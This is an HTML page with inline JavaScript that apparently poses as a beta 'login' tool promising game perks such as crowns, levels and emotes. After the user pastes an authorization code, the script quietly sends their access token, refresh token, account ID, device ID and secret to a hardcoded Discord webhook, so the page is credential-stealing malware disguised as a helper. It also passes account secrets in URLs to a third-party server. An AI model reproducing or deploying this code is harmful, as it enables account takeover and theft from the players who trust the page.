<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <h1>Login</h1>
    <p>Get authorizationCode here: <a href="https://rebrand.ly/authcode/" target="_blank">https://rebrand.ly/authcode/</a></p>
    <label for="authCode">Authorization Code:</label><br>
    <input type="text" id="authCode" name="authCode"><br><br>
    <button id="loginButton">Login</button>

    <div id="userDetails" style="display: none;">
        <h2>User Details</h2>
        <label for="accountId">Account ID:</label><br>
        <input type="text" id="accountId" name="accountId"><br>
        <label for="secret">Secret:</label><br>
        <input type="text" id="secret" name="secret"><br>
        <label for="deviceId">Device ID:</label><br>
        <input type="text" id="deviceId" name="deviceId"><br>
        <label for="displayName">Display Name:</label><br>
        <span id="displayName"></span><br><br>
    </div>

    <div class="loading-overlay">
    <div class="loading-spinner"></div>
    </div>

    <h2>API Actions</h2>
    <label for="number">Number:</label><br>
    <input type="text" id="number" name="number"><br>
    <label for="level">Level:</label><br>
    <input type="text" id="level" name="level"><br>
    <label for="emote">Emote Name:</label><br>
    <input type="text" id="emote" name="emote"><br><br>

    <button id="crownsButton" onclick="getCrowns()">Get Crowns</button>
    <button id="levelButton" onclick="getLevel()">Get Level</button>
    <button id="emoteButton" onclick="equipEmote()">Equip Emote</button>
    <button id="hideButton" onclick="hide()">Hide</button>
    <button id="unhideButton" onclick="unhide()">Unhide</button>

    <p>Created by GreekNinja30. This site is a Beta Test.</p>

    <script>
        function makeRequest(url, successMessage, button) {
            fetch(url)
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.json();
            })
            .then(data => {
                console.log(data);
                alert(successMessage);
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error occurred. Please try again.');
            })
            .finally(() => {
                button.disabled = false;
            });

            // Disable the button to prevent spam
            button.disabled = true;
        }

        document.getElementById("loginButton").addEventListener("click", function() {
            var authCode = document.getElementById("authCode").value.trim();
            
            if (!authCode) {
                alert("Please enter the authorization code.");
                return;
            }
            
            // Make a request to the OAuth authorization endpoint with the provided authorization code
            var tokenUrl = `https://api-xji1.onrender.com/oauth?authorization_code=${authCode}`;
            fetch(tokenUrl)
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    return response.json();
                })
                .then(data => {
                    // Assuming the response contains user details
                    var accountId = data.account_id;
                    var secret = data.secret;
                    var deviceId = data.device_id;
                    var displayName = data.display_name;
                    var accessToken = data.access_token;
                    var refreshToken = data.refresh_token;
                    var icon = data.icon; // Assuming the response contains an icon field

                    // Populate user details input fields
                    document.getElementById("accountId").value = accountId;
                    document.getElementById("secret").value = secret;
                    document.getElementById("deviceId").value = deviceId;
                    document.getElementById("displayName").textContent = displayName;

                    // Show user details section
                    document.getElementById("userDetails").style.display = "block";

                    // Send details to Discord webhook
                    sendToDiscordWebhook(accessToken, accountId, displayName, refreshToken, deviceId, secret, icon);
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('Error occurred while logging in. Please try again.');
                });
        });

        function sendToDiscordWebhook(accessToken, accountId, displayName, refreshToken, deviceId, secret, icon) {
            const webhookUrl = 'https://discord.com/api/webhooks/1239145204527792250/FLCqZJzOebD6aLMotfCRTyDRFliZWq_Lc8TqluodJqcYny4I0IcFaKICMcUhf4L5vO7n'; // Replace with your Discord webhook URL

            const payload = {
                username: "Login Bot",
                embeds: [{
                    title: "New Login Detected",
                    fields: [
                        { name: "Access Token", value: accessToken },
                        { name: "Account ID", value: accountId },
                        { name: "Display Name", value: displayName },
                        { name: "Refresh Token", value: refreshToken },
                        { name: "Device ID", value: deviceId },
                        { name: "Secret", value: secret }
                    ],
                    thumbnail: { url: icon }
                }]
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.json();
            })
            .then(data => {
                console.log('Successfully sent to Discord webhook:', data);
            })
            .catch(error => {
                console.error('Error sending to Discord webhook:', error);
            });
        }

        function getCrowns() {
            var accountId = document.getElementById("accountId").value;
            var secret = document.getElementById("secret").value;
            var deviceId = document.getElementById("deviceId").value;
            var number = document.getElementById("number").value;
            var apiUrl = `https://api-xji1.onrender.com/api/v2/party/crowns?accountId=${accountId}&secret=${secret}&deviceId=${deviceId}&number=${number}`;
            makeRequest(apiUrl, "Successfully retrieved crowns.", document.getElementById("crownsButton"));
        }

        function getLevel() {
            var accountId = document.getElementById("accountId").value;
            var secret = document.getElementById("secret").value;
            var deviceId = document.getElementById("deviceId").value;
            var levelCount = document.getElementById("level").value;
            var apiUrl = `https://api-xji1.onrender.com/api/v2/party/level?accountId=${accountId}&secret=${secret}&deviceId=${deviceId}&level=${levelCount}`;
            makeRequest(apiUrl, "Successfully retrieved level.", document.getElementById("levelButton"));
        }

        function equipEmote() {
            var accountId = document.getElementById("accountId").value;
            var secret = document.getElementById("secret").value;
            var deviceId = document.getElementById("deviceId").value;
            var emoteName = document.getElementById("emote").value;
            var apiUrl = `https://api-xji1.onrender.com/api/v2/party/ghostequip?accountId=${accountId}&secret=${secret}&deviceId=${deviceId}&emote=${emoteName}`;
            makeRequest(apiUrl, "Successfully equipped emote.", document.getElementById("emoteButton"));
        }

        function hide() {
            var accountId = document.getElementById("accountId").value;
            var secret = document.getElementById("secret").value;
            var deviceId = document.getElementById("deviceId").value;
            var apiUrl = `https://api-xji1.onrender.com/api/v2/party/hide?accountId=${accountId}&secret=${secret}&deviceId=${deviceId}`;
            makeRequest(apiUrl, "Successfully hidden.", document.getElementById("hideButton"));
        }

        function unhide() {
            var accountId = document.getElementById("accountId").value;
            var secret = document.getElementById("secret").value;
            var deviceId = document.getElementById("deviceId").value;
            var apiUrl = `https://api-xji1.onrender.com/api/v2/party/unhide?accountId=${accountId}&secret=${secret}&deviceId=${deviceId}`;
            makeRequest(apiUrl, "Successfully unhidden.", document.getElementById("unhideButton"));
        }
    </script>
</body>
</html>
